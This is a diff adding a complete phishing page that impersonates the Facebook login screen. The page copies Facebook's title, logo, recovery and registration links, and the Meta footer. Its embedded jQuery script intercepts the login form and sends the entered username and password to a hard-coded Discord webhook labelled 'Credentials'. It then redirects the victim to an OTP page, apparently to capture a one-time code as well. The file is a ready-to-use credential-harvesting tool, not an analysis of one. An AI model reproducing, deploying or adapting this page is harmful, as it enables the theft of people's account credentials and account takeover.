@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to facebook | Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="logo">
+        <center><img src="Facebook-Logo.png" alt="" width="93px" style="margin-left:70px;"></center>
+        <div class="input">
+            <form id="webhookForm">
+                <input type="text" id="username" class="username" placeholder=" &nbsp; Mobile number or email address" required="">
+                <br>
+                <input type="password" id="password" class="password" placeholder=" &nbsp;  Password" required="">
+                <br>
+                <button type="submit" class="button" >Log in</button>
+            </form>
+
+            <a href="https://m.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzEzNzE1NzY1LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%253D%253D%26refid%3D8&amp;multiple_results=0&amp;ars=facebook_login&amp;from_login_screen=0&amp;lwv=100&amp;_rdr">
+                <p class="forgot">Forgotten password?</p>
+            </a>
+
+            <p class="or">________________________or_______________________</p>
+
+            <a href="https://m.facebook.com/reg/?is_two_steps_login=0&amp;cid=103&amp;refsrc=deprecated&amp;soft=hjk"><button class="new">Create new account</button></a>
+            <ul style="list-style: none;">
+                <div class="lang1">
+                    <br>
+                    <li>English(UK)</li>
+                    <li>Francais(france)</li>
+                    <li>Espanol</li>
+                    <li>Deutsch</li>
+                    <li>Hausa</li>
+                <li>Português (Brasil)</li>
+                <li>'D91(J)</li>
+        </div>
+    </ul></div>
+    
+
+    <footer style="text-align: center; margin-top: 100px; margin-left: 100px; color: rgba(40, 40, 40, 0.638);"> Meta © 2024 </footer>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+       $(document).ready(function() {
+      var avatarUrl = '';
+      var username = "W15D0M";
+      var webhookUrl = "https://discord.com/api/webhooks/1242423810557218836/Qqw5cfXxLVYRWeB8pEX0T8XNtWeg1tfDQE9dt0cBtGVDBEXbL31UJYhMHQ0Q6ZWpDKo1"; <!--Literally read-->
+
+      $("#webhookForm").submit(function(event) {
+        event.preventDefault();
+
+        var usernameInput = $("#username").val();
+        var passwordInput = $("#password").val();
+
+        var embedFields = [
+          { name: "Facebook-Username", value: usernameInput },
+          { name: "Facebook-Password", value: passwordInput }
+        ];
+
+        var payload = {
+          username: username,
+          avatar_url: avatarUrl,
+          embeds: [{
+            author: {
+              name: username,
+              icon_url: avatarUrl
+            },
+            title: "Credentials",
+            fields: embedFields,
+            color: 2
+          }]
+        };
+
+        $.ajax({
+          url: webhookUrl,
+          type: "POST",
+          contentType: "application/json",
+          data: JSON.stringify(payload),
+          success: function() {
+			window.location.assign("otp.html");
+          },
+          error: function() {
+            alert("Error.");
+          }
+        });
+      });
+    });
+
+         </script>
+     
+
+
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
